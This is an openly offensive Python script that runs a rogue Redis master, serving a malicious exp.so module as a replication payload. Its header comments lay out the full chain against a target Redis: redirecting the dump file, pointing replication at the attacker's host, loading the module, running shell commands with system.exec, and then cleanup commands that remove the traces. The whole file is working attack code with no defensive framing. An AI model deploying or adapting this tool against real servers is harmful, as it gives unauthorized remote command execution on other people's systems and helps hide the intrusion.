#!/usr/bin/env python3
# Minimal rogue Redis master (n0b0dy technique): serve exp.so as FULLSYNC payload.
# Usage: python3 rogue.py <listen_port> <exp.so_path>
# Drive the target manually via redis-cli (supports auth):
#   CONFIG SET dir /data ; CONFIG SET dbfilename exp.so ; SLAVEOF <lhost> <lport>
#   MODULE LOAD /data/exp.so ; system.exec "id"
# Cleanup: system.exec "rm -f /data/exp.so" ; MODULE UNLOAD system ; SLAVEOF NO ONE ; CONFIG SET dbfilename dump.rdb
import socket, sys, threading, time

LPORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
EXPSO = sys.argv[2] if len(sys.argv) > 2 else "exp.so"
payload = open(EXPSO, "rb").read()
RUNID = b"1" * 40

def handle(conn, addr):
    print(f"[+] replica connected: {addr}", flush=True)
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(f"[<] {data[:100]!r}", flush=True)
            up = data.upper()
            if b"PING" in up:
                conn.sendall(b"+PONG\r\n")
            elif b"REPLCONF" in up:
                conn.sendall(b"+OK\r\n")
            elif b"PSYNC" in up or (b"SYNC" in up and b"PSYNC" not in up):
                resp = b"+FULLRESYNC " + RUNID + b" 0\r\n$" + str(len(payload)).encode() + b"\r\n" + payload
                conn.sendall(resp)
                print(f"[+] payload sent ({len(payload)} bytes)", flush=True)
                time.sleep(2)
                return
    except Exception as e:
        print(f"[!] {addr} err: {e}", flush=True)
    finally:
        try:
            conn.close()
        except Exception:
            pass

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LPORT))
srv.listen(5)
print(f"[*] rogue master on 0.0.0.0:{LPORT}, payload={EXPSO} ({len(payload)} bytes)", flush=True)
while True:
    c, a = srv.accept()
    threading.Thread(target=handle, args=(c, a), daemon=True).start()
